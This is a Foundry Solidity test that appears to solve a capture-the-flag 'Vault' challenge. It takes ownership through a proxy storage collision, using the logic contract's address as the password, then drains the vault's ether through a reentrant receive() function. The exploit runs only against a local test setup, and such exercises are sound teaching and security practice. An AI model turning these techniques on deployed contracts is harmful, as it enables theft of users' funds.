// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 2 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 0.1 ether);
        vm.startPrank(address(this));

        // add your hacker code.
        //change owner
        bytes32 password = bytes32(uint256(uint160(address(logic))));
        (bool ok,) = address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", password, address(this)));
        require( ok, "changeOwner failed");
        console.log('owner:', vault.owner());
    
        //withdraw
        vault.deposite{value: 0.1 ether}();
        vault.openWithdraw();
        vault.withdraw();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

    receive() external payable {
        console.log('receive/fallback');
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}